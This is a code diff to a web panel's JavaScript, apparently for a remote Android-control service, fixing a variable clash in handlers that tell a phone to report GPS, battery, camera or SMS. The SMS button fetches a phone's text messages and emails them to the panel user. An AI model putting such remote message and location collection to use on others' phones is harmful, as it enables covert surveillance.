@@ -68,7 +68,7 @@ var getGps = document.getElementsByClassName("action-get-gps");
 var vibrate = document.getElementsByClassName("action-vibrate");
 var battery = document.getElementsByClassName("action-battery");
 var images = document.getElementsByClassName("action-camera");
-var texts = document.getElementsByClassName("action-texts");
+var sms = document.getElementsByClassName("action-texts");
 var sendTexts = document.getElementsByClassName("action-send-text");
 var texts = document.getElementsByClassName("action-send-text-text");
 var phones = document.getElementsByClassName("action-send-phone");
@@ -122,9 +122,8 @@ for (var i = 0; i < vibrate.length; i++) {
       }, false);
 });
 }
-for (var i = 0; i < texts.length; i++) {
-  console.log(vibrate[i]);
-    texts[i].addEventListener('click', function(){
+for (var i = 0; i < sms.length; i++) {
+    sms[i].addEventListener('click', function(){
       $.get("https://socketdroid.com/command/sms/" + $(this).data('id'), function(data, status){
         notifyMe("Getting SMS and emailing to you!");
       }, false);
